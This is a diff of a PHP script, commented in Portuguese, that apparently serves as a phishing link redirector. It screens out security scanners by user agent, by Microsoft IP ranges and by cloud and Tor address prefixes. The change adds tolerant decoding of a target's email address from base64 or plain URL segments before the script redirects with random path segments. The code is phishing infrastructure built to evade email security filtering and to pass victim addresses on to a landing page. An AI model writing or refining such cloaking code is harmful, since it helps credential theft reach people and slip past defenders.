@@ -10,7 +10,6 @@ $bot_agents = [
     'curl', 'python-requests', 'Go-http-client',
     'Wget', 'libwww-perl'
 ];
-
 foreach ($bot_agents as $bot) {
     if (stripos($user_agent, $bot) !== false) {
         http_response_code(200);
@@ -35,7 +34,6 @@ $microsoft_ranges = [
     ['104.40.0.0',   '104.47.255.255'],
     ['4.192.0.0',    '4.207.255.255'],
 ];
-
 $ip_long = ip2long($ip);
 if ($ip_long !== false) {
     foreach ($microsoft_ranges as $range) {
@@ -51,7 +49,6 @@ $bot_ip_prefixes = [
     '54.', '52.1', '34.', '35.',
     '185.220.',
 ];
-
 foreach ($bot_ip_prefixes as $prefix) {
     if (strpos($ip, $prefix) === 0) {
         http_response_code(200);
@@ -77,11 +74,54 @@ function generateSegment($length) {
     return $result;
 }
 
-// Extrai email da URL
-$requestUri = $_SERVER['REQUEST_URI'];
+// Decodifica base64url ou base64 normal (tolerante a padding)
+function decodeEmailFromUrl(string $part): string {
+    // Remove padding == ou = do final da URL
+    $part = rtrim($part, '=');
+    // Tenta base64url (-_ → +/)
+    $b64url = str_pad(strtr($part, '-_', '+/'), strlen($part) + (4 - strlen($part) % 4) % 4, '=');
+    $decoded = base64_decode($b64url, true);
+    if ($decoded && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
+        return $decoded;
+    }
+    // Tenta base64 normal com padding restaurado
+    $b64 = str_pad($part, strlen($part) + (4 - strlen($part) % 4) % 4, '=');
+    $decoded = base64_decode($b64, true);
+    if ($decoded && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
+        return $decoded;
+    }
+    return '';
+}
+
+// Extrai email da URL — 3 modos: base64url, email cru no segmento, regex fallback
+$requestUri = $_SERVER['REQUEST_URI'] ?? '';
 $email = '';
-if (preg_match('/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/', $requestUri, $matches)) {
-    $email = $matches[1];
+
+$path  = parse_url($requestUri, PHP_URL_PATH) ?? '';
+$parts = explode('/', trim($path, '/'));
+
+foreach ($parts as $part) {
+    if (empty($part)) continue;
+
+    // Modo 1: base64url ou base64 normal
+    $decoded = decodeEmailFromUrl($part);
+    if ($decoded !== '') {
+        $email = $decoded;
+        break;
+    }
+
+    // Modo 2: email cru no segmento
+    if (filter_var($part, FILTER_VALIDATE_EMAIL)) {
+        $email = $part;
+        break;
+    }
+}
+
+// Modo 3: regex fallback na URL inteira
+if (empty($email)) {
+    if (preg_match('/([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})/', $requestUri, $matches)) {
+        $email = $matches[1];
+    }
 }
 
 // Com ou sem email — sempre redireciona com segmentos randômicos
